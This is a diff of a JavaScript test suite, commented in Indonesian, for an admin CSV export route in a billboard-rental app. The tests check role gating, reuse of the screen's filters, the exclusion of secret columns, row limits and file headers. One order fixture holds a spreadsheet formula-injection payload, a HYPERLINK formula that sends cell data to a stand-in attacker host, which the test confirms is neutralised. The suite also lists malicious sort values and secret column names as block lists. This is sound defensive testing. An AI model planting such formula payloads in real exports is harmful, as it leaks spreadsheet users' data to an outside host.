+    // Matriks peran × daftar. Ditulis sebagai tabel, bukan deretan `it`, supaya
+    // menambah daftar kelima berarti menambah satu baris di sini — dan baris yang
+    // TIDAK ditambahkan langsung terlihat sebagai daftar yang gerbangnya tidak
+    // pernah diuji.
+    const IZIN = {
+      billboards: ['ADMIN', 'SUPER_ADMIN', 'CS', 'OPERATOR'],
+      orders: ['ADMIN', 'SUPER_ADMIN', 'OPERATOR'],
+      users: ['ADMIN', 'SUPER_ADMIN'],
+      pengajuan: ['ADMIN', 'SUPER_ADMIN'],
+    };
+    const SEMUA_PERAN = ['ADMIN', 'SUPER_ADMIN', 'CS', 'OPERATOR', 'USER'];
+
+    for (const [daftar, boleh] of Object.entries(IZIN)) {
+      it('gerbang ' + daftar + ' persis: ' + boleh.join(', '), async () => {
+        for (const peran of SEMUA_PERAN) {
+          const db = buatPrisma();
+          const route = buatRouteEkspor(db, peran);
+          const res = await route.GET(mintaEkspor('?daftar=' + daftar));
+
+          if (boleh.includes(peran)) {
+            assert.equal(res.status, 200, peran + ' → ' + daftar);
+          } else {
+            assert.equal(res.status, 403, peran + ' → ' + daftar);
+            // Ditolak SEBELUM query, bukan setelah barisnya diambil: baris yang
+            // sudah terbaca dari database lalu dibuang tetap pernah melewati
+            // memori proses ini, dan tetap muncul di log query.
+            assert.equal(db.panggilan.length, 0, peran + ' → ' + daftar);
+          }
+        }
+      });
+    }
+
+    it('gerbangnya menyebut konstanta peran, bukan daftar teks yang ditulis ulang', () => {
+      // Daftar peran yang ditulis ulang di sini adalah salinan kedua dari
+      // keputusan yang sudah diambil di `@/lib/gerbang-peran` — dan yang
+      // menyimpang tidak menghasilkan galat, melainkan orang yang salah
+      // mengunduh berkas yang salah.
+      assert.match(kodeRoute, /peran: PERAN_PEMBACA_PANEL,/);
+      assert.match(kodeRoute, /peran: PERAN_PEMBACA_PESANAN,/);
+      const pengelola = kodeRoute.match(/peran: PERAN_PENGELOLA,/g) ?? [];
+      assert.equal(pengelola.length, 2, 'users dan pengajuan wajib PERAN_PENGELOLA');
+      assert.doesNotMatch(kodeRoute, /peran: \[/);
+      assert.doesNotMatch(kodeRoute, /Role\.(ADMIN|SUPER_ADMIN|CS|OPERATOR)/);
+    });
+
+    it('CS memang ikut di PERAN_PEMBACA_PANEL dan memang TIDAK di dua lainnya', () => {
+      // Pengikat yang menghubungkan matriks di atas dengan sumber izinnya. Tanpa
+      // ini, memperluas `PERAN_PEMBACA_PESANAN` dengan CS akan membuat matriksnya
+      // gagal tanpa memberi tahu di mana keputusannya berubah.
+      assert.equal(gerbang.PERAN_PEMBACA_PANEL.includes('CS'), true);
+      assert.equal(gerbang.PERAN_PEMBACA_PESANAN.includes('CS'), false);
+      assert.equal(gerbang.PERAN_PENGELOLA.includes('CS'), false);
+      assert.equal(gerbang.PERAN_PENGELOLA.includes('OPERATOR'), false);
+    });
+  });
+
+  describe('barisnya wajib sama dengan layar', () => {
+    it('billboards memakai whereBillboard dan URUT_BILLBOARD, bukan salinannya', async () => {
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=billboards&q=Sudirman&urut=harga-naik'));
+
+      const [args] = db.argumen('billboard.findMany');
+      assert.deepEqual(args.where, saringan.whereBillboard('Sudirman'));
+      assert.deepEqual(args.orderBy, saringan.URUT_BILLBOARD['harga-naik']);
+    });
+
+    it('users memakai whereUser dan URUT_USER, bukan salinannya', async () => {
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=users&q=budi&urut=nama-naik'));
+
+      const [args] = db.argumen('user.findMany');
+      assert.deepEqual(args.where, saringan.whereUser('budi'));
+      assert.deepEqual(args.orderBy, saringan.URUT_USER['nama-naik']);
+    });
+
+    it('orders memakai whereBooking dengan tab yang diminta', async () => {
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=orders&status=REFUND&q=budi'));
+
+      const [args] = db.argumen('booking.findMany');
+      assert.deepEqual(args.where, saringan.whereBooking('REFUND', 'budi'));
+    });
+
+    it('pengajuan memakai wherePengajuan dengan status yang diminta', async () => {
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=pengajuan&status=BARU&q=bandung'));
+
+      const [args] = db.argumen('pengajuanTitik.findMany');
+      assert.deepEqual(args.where, saringan.wherePengajuan('BARU', 'bandung'));
+    });
+
+    it('status pengajuan asing jatuh ke SEMUA, tidak lolos ke Prisma', async () => {
+      // `?status=DROP` yang lolos ke `where` membuat Prisma melempar, dan galat
+      // di route unduhan muncul sebagai berkas yang gagal terunduh tanpa
+      // penjelasan apa pun.
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=pengajuan&status=DROP'));
+
+      const [args] = db.argumen('pengajuanTitik.findMany');
+      assert.deepEqual(args.where, saringan.wherePengajuan('SEMUA', ''));
+    });
+
+    it('urut TIDAK PERNAH dirangkai dari teks URL', async () => {
+      // Tabel `User` punya `password`, `ktp`, dan `npwp`. Tidak satu pun
+      // dirender, tapi `?urut=password` yang lolos ke Prisma MENGURUTKAN baris
+      // menurut hash bcrypt — dan urutan baris adalah informasi.
+      for (const jahat of ['password', 'ktp', 'npwp', 'id', '__proto__']) {
+        const db = buatPrisma();
+        const route = buatRouteEkspor(db);
+        await route.GET(mintaEkspor('?daftar=users&urut=' + jahat));
+
+        const [args] = db.argumen('user.findMany');
+        assert.deepEqual(args.orderBy, saringan.URUT_USER.terbaru, jahat);
+        assert.equal(JSON.stringify(args.orderBy).includes(jahat), false, jahat);
+      }
+    });
+
+    it('kata kunci dibaca lewat bacaKataKunci, jadi panjangnya terbatas', async () => {
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=users&q=' + 'a'.repeat(500)));
+
+      const [args] = db.argumen('user.findMany');
+      assert.deepEqual(args.where, saringan.whereUser('a'.repeat(80)));
+    });
+
+    it('urutan pesanan ditulis eksplisit walau halamannya tidak punya pemilih urut', async () => {
+      // Ekspor yang barisnya benar dengan urutan berbeda tetap salah: yang
+      // dibandingkan admin antara berkas dan layar adalah baris ke-n.
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=orders'));
+
+      const [args] = db.argumen('booking.findMany');
+      assert.deepEqual(args.orderBy, { createdAt: 'desc' });
+    });
+
+    it('where dan orderBy diimpor dari saringan-daftar, tidak ditulis ulang di route', () => {
+      assert.match(kodeRoute, /from '@\/lib\/saringan-daftar'/);
+      for (const nama of ['whereBillboard', 'whereBooking', 'wherePengajuan', 'whereUser']) {
+        assert.match(kodeRoute, new RegExp('\\b' + nama + '\\b'), nama);
+      }
+      // `where: { OR: [` yang ditulis langsung di route adalah salinan klausa
+      // pencarian — bentuk yang menghasilkan berkas dengan himpunan baris
+      // berbeda dari layar tanpa satu pun galat.
+      assert.doesNotMatch(kodeRoute, /where: \{\s*OR:/);
+      assert.doesNotMatch(kodeRoute, /contains:/);
+    });
+  });
+
+  describe('kolom rahasia tidak pernah ikut', () => {
+    // Daftar ini bukan gaya penulisan. Setiap namanya adalah kolom yang, dalam
+    // satu berkas yang memuat SELURUH barisnya, berbeda secara jenis dari kolom
+    // yang sama pada satu profil yang dibuka untuk satu keperluan.
+    const TERLARANG = [
+      'password',        // hash bcrypt — bahan serangan luring
+      'ktp',             // nomor identitas resmi
+      'npwp',
+      'ktpAddress',
+      'officeAddress',
+      'otpCode',
+      'otpExpires',
+      'xenditCustomerId',
+      'userBankName',    // nomor rekening pembeli: cukup untuk memulai penipuan
+      'userBankAccount',
+      'refundProof',
+      'providerSessionId',
+      'providerReferenceId',
+      'providerPaymentId',
+      'callbackPayload',
+      'components_sdk_key',
+    ];
+
+    const KASUS = [
+      ['billboards', 'billboard.findMany'],
+      ['orders', 'booking.findMany'],
+      ['users', 'user.findMany'],
+      ['pengajuan', 'pengajuanTitik.findMany'],
+    ];
+
+    for (const [daftar, metode] of KASUS) {
+      it(daftar + ': select-nya eksplisit dan tidak memuat satu pun kolom rahasia', async () => {
+        const db = buatPrisma();
+        const route = buatRouteEkspor(db);
+        await route.GET(mintaEkspor('?daftar=' + daftar));
+
+        const [args] = db.argumen(metode);
+
+        // `select` WAJIB ada. `include` maupun query tanpa keduanya mengambil
+        // SELURUH kolom tabel — cacat yang sudah pernah menanam hash password
+        // seluruh pengguna ke dalam HTML halaman admin, dan di berkas ekspor ia
+        // menghasilkan salinan permanen di luar aplikasi.
+        assert.ok(args.select, daftar + ' tidak memakai select eksplisit');
+        assert.equal(args.include, undefined, daftar + ' memakai include');
+
+        const teks = JSON.stringify(args.select);
+        for (const kolom of TERLARANG) {
+          assert.equal(teks.includes(kolom), false, daftar + ' membawa ' + kolom);
+        }
+      });
+    }
+
+    it('tidak satu pun nama kolom rahasia muncul di sumber route', () => {
+      // Pengikat kedua, dari arah yang berbeda: pemeriksaan di atas hanya melihat
+      // `select` yang benar-benar dijalankan, jadi kolom rahasia yang ditambahkan
+      // ke cabang yang belum diuji akan lolos.
+      for (const kolom of TERLARANG) {
+        assert.equal(kodeRoute.includes(kolom), false, kolom);
+      }
+    });
+  });
+
+  describe('isi berkas: pesanan', () => {
+    function pesanan(ganti = {}) {
+      return {
+        id: 'clx000000000000000000001',
+        status: 'PAID_CONFIRMED',
+        startDate: new Date('2026-10-01T03:00:00.000Z'),
+        endDate: new Date('2026-12-31T03:00:00.000Z'),
+        duration: 3,
+        totalPrice: new Prisma.Decimal('15000000'),
+        createdAt: new Date('2026-09-20T03:30:00.000Z'),
+        paidAt: null,
+        refundAmount: null,
+        billboard: { sku: 'BB-01', title: 'Jl. Sudirman No. 5, Jakarta' },
+        user: {
+          name: '=HYPERLINK("https://jahat.example/?d="&A1,"Klik")',
+          email: 'pembeli@contoh.test',
+          whatsapp: '+6281234567890',
+          companyName: 'PT "Maju" Jaya, Tbk',
+        },
+        additionalCharges: [{ amount: new Prisma.Decimal('250000') }],
+        payments: [
+          { tujuan: PaymentTujuan.DP, status: PaymentStatus.PAID, jumlah: new Prisma.Decimal('6000000') },
+          { tujuan: PaymentTujuan.PELUNASAN, status: PaymentStatus.PENDING, jumlah: new Prisma.Decimal('9000000') },
+        ],
+        ...ganti,
+      };
+    }
+
+    async function csvPesanan(baris) {
+      const db = buatPrisma({ 'booking.findMany': baris });
+      const route = buatRouteEkspor(db);
+      const res = await route.GET(mintaEkspor('?daftar=orders'));
+      assert.equal(res.status, 200);
+      return bacaCsv(await res.text());
+    }
+
+    it('jumlah sel setiap baris sama dengan jumlah judul kolomnya', async () => {
+      // Header yang bergeser satu kolom terhadap barisnya menghasilkan berkas
+      // yang terbuka sempurna dengan SETIAP nilai berada di bawah judul yang
+      // salah — termasuk nominal di bawah "Dibuat".
+      const csv = await csvPesanan([pesanan()]);
+      assert.equal(csv.length, 2);
+      assert.equal(csv[1].length, csv[0].length);
+      assert.equal(csv[0].length, 21);
+    });
+
+    it('nominal ditulis sebagai angka mentah, bukan "Rp 15.000.000"', async () => {
+      // `angkaRupiah()` menyisipkan titik pemisah ribuan, dan di spreadsheet
+      // `15.000.000` terbaca sebagai TEKS. Kolom teks tidak bisa dijumlahkan —
+      // yang justru satu-satunya alasan berkas ini diminta.
+      const csv = await csvPesanan([pesanan()]);
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+
+      assert.equal(peta.get('Nilai pesanan'), '15000000');
+      assert.equal(peta.get('Pokok masuk'), '6000000');
+      assert.equal(peta.get('Sisa pokok'), '9000000');
+      assert.equal(peta.get('Biaya tambahan'), '250000');
+      assert.equal(peta.get('Tambahan dibayar'), '0');
+      assert.equal(peta.get('Sisa tambahan'), '250000');
+      assert.equal(peta.get('Grand total'), '15250000');
+
+      const isi = csv.map((b) => b.join('|')).join('\n');
+      assert.equal(isi.includes('15.000.000'), false);
+      assert.equal(isi.includes('Rp'), false);
+    });
+
+    it('PENDING bukan uang: tagihan pelunasan yang menganggur tidak dihitung masuk', async () => {
+      const csv = await csvPesanan([pesanan()]);
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+      // Baris PELUNASAN 9.000.000 di atas berstatus PENDING. Kalau ia terhitung,
+      // "Pokok masuk" menjadi 15.000.000 dan berkas ini melaporkan pesanan lunas.
+      assert.equal(peta.get('Pokok masuk'), '6000000');
+      assert.equal(peta.get('Sisa pokok'), '9000000');
+    });
+
+    it('tanggal dikunci di zona WIB, tidak dipotong di UTC', async () => {
+      // `toISOString().slice(0, 10)` memotong di UTC: 1 Oktober pukul 06.00 WIB
+      // menjadi `2026-09-30`, dan berkas rekonsiliasi lalu menempatkan pesanan
+      // pada bulan yang salah — tepat di batas bulan, tempat angkanya dijumlahkan.
+      const csv = await csvPesanan([
+        pesanan({
+          startDate: new Date('2026-09-30T23:00:00.000Z'), // 1 Okt 06.00 WIB
+          createdAt: new Date('2026-09-30T23:00:00.000Z'),
+        }),
+      ]);
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+      assert.equal(peta.get('Mulai'), '2026-10-01');
+      assert.equal(peta.get('Dibuat'), '2026-10-01 06:00');
+      assert.equal(kodeRoute.includes('toISOString'), false);
+    });
+
+    it('kolom kosong tetap kosong, bukan tulisan "null"', async () => {
+      const csv = await csvPesanan([pesanan()]);
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+      assert.equal(peta.get('Refund'), '');
+      assert.equal(peta.get('Dibayar'), '');
+    });
+
+    it('nama pembeli berisi rumus dinetralkan, alamat berkoma tidak menggeser kolom', async () => {
+      const csv = await csvPesanan([pesanan()]);
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+
+      assert.ok(peta.get('Penyewa').startsWith('\t=HYPERLINK('), peta.get('Penyewa'));
+      assert.equal(peta.get('Titik'), 'Jl. Sudirman No. 5, Jakarta');
+      assert.equal(peta.get('Perusahaan'), 'PT "Maju" Jaya, Tbk');
+      // Nomornya tetap bisa dihubungi: `+` tidak dibuang.
+      assert.ok(peta.get('WhatsApp').includes('+6281234567890'), peta.get('WhatsApp'));
+    });
+
+    it('nomor pesanan ditulis sebagai label yang dikenali admin, bukan id mentah', async () => {
+      const csv = await csvPesanan([pesanan()]);
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+      // Dinetralkan tab karena `#` bukan pembuka rumus — jadi ia lewat apa adanya.
+      assert.ok(peta.get('Nomor').startsWith('#'), peta.get('Nomor'));
+      assert.equal(peta.get('Nomor').includes('clx000000000000000000001'), false);
+    });
+  });
+
+  describe('isi berkas: pengguna', () => {
+    it('dua angka turunannya dihitung dari ledger, sama seperti layarnya', async () => {
+      // Rumus yang berbeda di sini menghasilkan berkas yang angkanya berbeda dari
+      // layar pada baris YANG SAMA — dan itu selisih yang akan dicari admin di
+      // pembukuan, bukan di kode ekspor.
+      const db = buatPrisma({
+        'user.findMany': [
+          {
+            id: 'u1',
+            name: 'Budi',
+            email: 'budi@contoh.test',
+            role: 'USER',
+            whatsapp: '+628111',
+            companyName: null,
+            authProvider: 'credentials',
+            isVerified: true,
+            createdAt: new Date('2026-01-02T03:00:00.000Z'),
+          },
+        ],
+        'booking.groupBy': (args) =>
+          args._sum
+            ? [{ userId: 'u1', _sum: { refundAmount: new Prisma.Decimal('500000') } }]
+            : [{ userId: 'u1', _count: { _all: 4 } }],
+        'payment.findMany': [
+          { jumlah: new Prisma.Decimal('6000000'), booking: { userId: 'u1' } },
+          { jumlah: new Prisma.Decimal('250000'), booking: { userId: 'u1' } },
+        ],
+      });
+      const route = buatRouteEkspor(db);
+      const res = await route.GET(mintaEkspor('?daftar=users'));
+      const csv = bacaCsv(await res.text());
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+
+      assert.equal(csv[1].length, csv[0].length);
+      assert.equal(peta.get('Jumlah order'), '4');
+      // 6.000.000 + 250.000 − 500.000 refund
+      assert.equal(peta.get('Total belanja'), '5750000');
+      assert.equal(peta.get('Terverifikasi'), 'ya');
+      assert.equal(peta.get('Perusahaan'), '');
+      // `id` dipakai untuk melipat dua peta di atas, tapi TIDAK ikut diekspor.
+      assert.equal(csv[0].includes('id'), false);
+      assert.equal(csv[1].includes('u1'), false);
+    });
+
+    it('refund yang melebihi penerimaan ditahan di nol, tidak menjadi negatif', async () => {
+      // Angka negatif di kolom belanja pelanggan lebih membingungkan daripada
+      // informatif, dan layarnya sudah menahannya di nol.
+      const db = buatPrisma({
+        'user.findMany': [
+          {
+            id: 'u1', name: 'Budi', email: 'b@c.test', role: 'USER', whatsapp: null,
+            companyName: null, authProvider: 'credentials', isVerified: false,
+            createdAt: new Date('2026-01-02T03:00:00.000Z'),
+          },
+        ],
+        'booking.groupBy': (args) =>
+          args._sum ? [{ userId: 'u1', _sum: { refundAmount: new Prisma.Decimal('9000000') } }] : [],
+        'payment.findMany': [{ jumlah: new Prisma.Decimal('1000000'), booking: { userId: 'u1' } }],
+      });
+      const route = buatRouteEkspor(db);
+      const csv = bacaCsv(await (await route.GET(mintaEkspor('?daftar=users'))).text());
+      const peta = new Map(csv[0].map((judul, i) => [judul, csv[1][i]]));
+
+      assert.equal(peta.get('Total belanja'), '0');
+      assert.equal(peta.get('Jumlah order'), '0');
+      assert.equal(peta.get('Terverifikasi'), 'tidak');
+    });
+
+    it('halaman tanpa satu pun pengguna tidak menembak tiga query turunan', async () => {
+      // `{ in: [] }` atas tabel Payment adalah pemindaian tanpa hasil yang
+      // dibayar sia-sia setiap kali pencarian tidak menemukan apa pun — yaitu
+      // keadaan yang paling sering terjadi.
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      await route.GET(mintaEkspor('?daftar=users&q=tidakada'));
+
+      assert.equal(db.argumen('payment.findMany').length, 0);
+      assert.equal(db.argumen('booking.groupBy').length, 0);
+    });
+  });
+
+  describe('batas baris: terpotong tidak pernah diam', () => {
+    it('take-nya BATAS + 1, supaya keterpotongan terdeteksi tanpa count kedua', async () => {
+      // `count` kedua adalah query tambahan atas tabel yang sama yang bisa
+      // menjawab angka berbeda dari `findMany` di sebelahnya, sementara yang
+      // dibutuhkan hanya satu bit: masih ada lagi atau tidak.
+      for (const [daftar, metode] of [
+        ['billboards', 'billboard.findMany'],
+        ['orders', 'booking.findMany'],
+        ['users', 'user.findMany'],
+        ['pengajuan', 'pengajuanTitik.findMany'],
+      ]) {
+        const db = buatPrisma();
+        const route = buatRouteEkspor(db);
+        await route.GET(mintaEkspor('?daftar=' + daftar));
+
+        const [args] = db.argumen(metode);
+        assert.equal(args.take, BATAS + 1, daftar);
+      }
+    });
+
+    function pengajuanBaris(i) {
+      return {
+        namaPemilik: 'Pemilik ' + i,
+        nomorWa: '0811' + i,
+        email: null,
+        kota: 'Bandung',
+        alamat: 'Jl. Contoh',
+        ukuran: '4x6',
+        catatan: null,
+        status: 'BARU',
+        catatanAdmin: null,
+        createdAt: new Date('2026-01-02T03:00:00.000Z'),
+        ditanganiOleh: null,
+      };
+    }
+
+    it('tepat pada batas: tidak ditandai terpotong', async () => {
+      const db = buatPrisma({
+        'pengajuanTitik.findMany': Array.from({ length: BATAS }, (_, i) => pengajuanBaris(i)),
+      });
+      const route = buatRouteEkspor(db);
+      const res = await route.GET(mintaEkspor('?daftar=pengajuan'));
+
+      assert.equal(res.headers.get('X-Ekspor-Terpotong'), null);
+      const csv = bacaCsv(await res.text());
+      assert.equal(csv.length, BATAS + 1); // + judul kolom
+      assert.equal(csv[csv.length - 1].length, csv[0].length);
+    });
+
+    it('satu baris di atas batas: dipotong, DAN ditandai di dalam berkasnya', async () => {
+      // Penanda ditulis sebagai baris CSV, bukan hanya header HTTP: header tidak
+      // ikut saat berkasnya disimpan, dikirim lewat surel, atau dibuka bulan
+      // depan — dan yang membaca berkas terpotong tanpa tahu akan mencari
+      // selisihnya di pembukuan.
+      const db = buatPrisma({
+        'pengajuanTitik.findMany': Array.from({ length: BATAS + 1 }, (_, i) => pengajuanBaris(i)),
+      });
+      const route = buatRouteEkspor(db);
+      const res = await route.GET(mintaEkspor('?daftar=pengajuan'));
+
+      assert.equal(res.headers.get('X-Ekspor-Terpotong'), String(BATAS));
+
+      const csv = bacaCsv(await res.text());
+      // judul + BATAS baris data + satu baris penanda
+      assert.equal(csv.length, BATAS + 2);
+      assert.match(csv[csv.length - 1][0], /^Terpotong pada 5000 baris pertama\./);
+      // Barisnya benar-benar dipotong, bukan hanya ditandai.
+      assert.equal(csv[BATAS][0], 'Pemilik ' + (BATAS - 1));
+    });
+  });
+
+  describe('header respons berkas', () => {
+    it('setiap daftar punya awalan nama berkasnya sendiri', async () => {
+      const AWALAN = {
+        billboards: 'billboard-',
+        orders: 'pesanan-',
+        users: 'pengguna-',
+        pengajuan: 'pengajuan-titik-',
+      };
+
+      for (const [daftar, awalan] of Object.entries(AWALAN)) {
+        const db = buatPrisma();
+        const route = buatRouteEkspor(db);
+        const res = await route.GET(mintaEkspor('?daftar=' + daftar));
+
+        const disposisi = res.headers.get('content-disposition');
+        assert.match(disposisi, new RegExp('attachment; filename="' + awalan + '\\d{4}-\\d{2}-\\d{2}\\.csv"'), daftar);
+      }
+    });
+
+    it('tipe, encoding, dan no-store ikut di setiap unduhan', async () => {
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      const res = await route.GET(mintaEkspor('?daftar=billboards'));
+
+      assert.equal(res.headers.get('content-type'), 'text/csv; charset=utf-8');
+      assert.equal(res.headers.get('cache-control'), 'no-store');
+    });
+
+    it('daftar kosong tetap mengirim judul kolom, bukan berkas nol bita', async () => {
+      // Berkas kosong tidak bisa dibedakan dari unduhan yang gagal. Berkas berisi
+      // judul kolom tanpa baris menjawab pertanyaan sebenarnya: tidak ada yang
+      // cocok.
+      const db = buatPrisma();
+      const route = buatRouteEkspor(db);
+      const res = await route.GET(mintaEkspor('?daftar=billboards&q=tidakada'));
+
+      const csv = bacaCsv(await res.text());
+      assert.equal(csv.length, 1);
+      assert.equal(csv[0][0], 'SKU');
+    });
+  });
+
+  // ------------------------------------------------------------------- tombol
+  describe('tombol unduh di keempat halaman', () => {
+    const HALAMAN = [
+      ['billboards', jalurHalaman('billboards', 'page.tsx')],
+      ['orders', jalurHalaman('orders', 'page.tsx')],
+      ['users', jalurHalaman('users', 'UserClientPage.tsx')],
+      ['pengajuan', jalurHalaman('pengajuan', 'page.tsx')],
+    ];
+
+    for (const [nama, jalur] of HALAMAN) {
+      describe(nama, () => {
+        const kode = kodeSajaAny(jalur);
+        const elemen = (() => {
+          const mulai = kode.indexOf('<TombolEkspor');
+          assert.ok(mulai > 0, 'TombolEkspor tidak dirender di ' + nama);
+          return kode.slice(mulai, kode.indexOf('/>', mulai) + 2);
+        })();
+
+        it('nama daftarnya adalah daftar halaman ini, bukan halaman lain', () => {
+          // Kesalahan yang paling mudah terjadi saat blok ini disalin antar
+          // halaman — dan akibatnya tombol di halaman pengguna mengunduh
+          // inventori, tanpa satu pun tanda selain isi berkasnya.
+          assert.match(elemen, new RegExp('daftar="' + nama + '"'));
+        });
+
+        it('saringan yang sedang berlaku ikut dibawa lewat kueriAktif', () => {
+          // Tombol yang tidak membawanya mengunduh SELURUH tabel sementara layar
+          // menampilkan hasil pencarian, dan berkasnya tidak punya satu pun tanda
+          // bahwa isinya lebih luas daripada yang diminta.
+          assert.match(elemen, /parameter=\{kueriAktif\}/);
+        });
+
+        it('nomor halaman TIDAK ikut dibawa', () => {
+          // Yang diekspor adalah seluruh hasil saringan, bukan 25 baris yang
+          // sedang tampak. Ekspor sehalaman adalah salinan layar yang sudah ada
+          // di layar.
+          assert.doesNotMatch(elemen, /halaman/);
+        });
+      });
+    }
+
+    it('halaman yang gerbangnya lebih sempit menggambar tombolnya bersyarat', () => {
+      // Tombol yang selalu tampak lalu menjawab 403 adalah tombol yang tampak
+      // rusak: CS akan melaporkannya sebagai bug alih-alih memahami bahwa ekspor
+      // pesanan memang bukan haknya. Gerbang sesungguhnya tetap di route —
+      // komponen tidak menjaga apa pun — tapi tombol yang tidak pernah bisa
+      // dipakai tidak boleh digambar.
+      for (const [nama, jalur, konstanta] of [
+        ['orders', jalurHalaman('orders', 'page.tsx'), 'PERAN_PEMBACA_PESANAN'],
+        ['pengajuan', jalurHalaman('pengajuan', 'page.tsx'), 'PERAN_PENGELOLA'],
+        ['users', jalurHalaman('users', 'page.tsx'), 'PERAN_PENGELOLA'],
+      ]) {
+        const kode = kodeSajaAny(jalur);
+        assert.match(kode, new RegExp('peranBoleh\\(' + konstanta + ','), nama);
+      }
+
+      // billboards SENGAJA tanpa syarat: gerbangnya sama dengan pintu panel, jadi
+      // setiap admin yang bisa membuka halamannya memang boleh mengunduhnya.
+      // Syarat yang ditambahkan di sana akan menyembunyikan tombol yang berfungsi.
+      const kodeBillboards = kodeSajaAny(jalurHalaman('billboards', 'page.tsx'));
+      assert.doesNotMatch(kodeBillboards, /bolehEkspor/);
+    });
+
+    it('keputusan peran diambil server, dan UserClientPage tidak menerima Role', () => {
+      // `UserClientPage` adalah Client Component: props-nya tertanam di HTML
+      // halaman. Ia menerima boolean yang sudah diputuskan server, bukan `Role`
+      // yang lalu dibandingkan di browser — perbandingan peran di sisi client
+      // adalah gerbang yang bisa dibaca dan diubah siapa pun yang membuka
+      // devtools.
+      const kodeKlien = kodeSajaAny(jalurHalaman('users', 'UserClientPage.tsx'));
+      assert.match(kodeKlien, /bolehEkspor: boolean;/);
+      assert.doesNotMatch(kodeKlien, /peranBoleh/);
+      assert.doesNotMatch(kodeKlien, /PERAN_/);
+
+      const kodeServer = kodeSajaAny(jalurHalaman('users', 'page.tsx'));
+      assert.match(kodeServer, /bolehEkspor=\{bolehEkspor\}/);
+    });
+
+    it('tombolnya tautan biasa: nol JavaScript dikirim, nama berkas dari server', () => {
+      // `fetch` + `createObjectURL` menahan dua salinan berkas beberapa megabita
+      // di memori tab yang juga sedang merender tabelnya, dan memerlukan
+      // `'use client'` beserta keadaan galat dan progresnya sendiri.
+      assert.doesNotMatch(kodeTombol, /'use client'/);
+      assert.doesNotMatch(kodeTombol, /useState|useEffect|createObjectURL|fetch\(/);
+      assert.match(kodeTombol, /href=\{`\/api\/admin\/ekspor\?\$\{query\.toString\(\)\}`\}/);
+
+      // `download` memaksa nama berkas dari sisi klien dan MENGABAIKAN
+      // `Content-Disposition` milik server — termasuk tanggal yang sengaja
+      // ditaruh di nama berkasnya.
+      assert.doesNotMatch(kodeTombol, /\sdownload[=\s>]/);
+    });
+
+    it('URL disusun lewat URLSearchParams, bukan template teks', () => {
+      // Kata kunci pencarian bisa memuat `&` dan `=`. Yang ditempel apa adanya
+      // memecah URL-nya menjadi parameter tambahan, sehingga berkas yang terunduh
+      // bukan yang diminta.
+      assert.match(kodeTombol, /new URLSearchParams\(\{ daftar \}\)/);
+      assert.match(kodeTombol, /query\.set\(kunci, String\(nilai\)\)/);
+      // Nilai kosong dibuang, jadi pemanggil boleh menyerahkan saringan yang
+      // sedang tidak aktif tanpa menghasilkan `?q=&urut=`.
+      assert.match(kodeTombol, /nilai === undefined \|\| nilai === null \|\| nilai === ''/);
+    });
+  });
+});
+
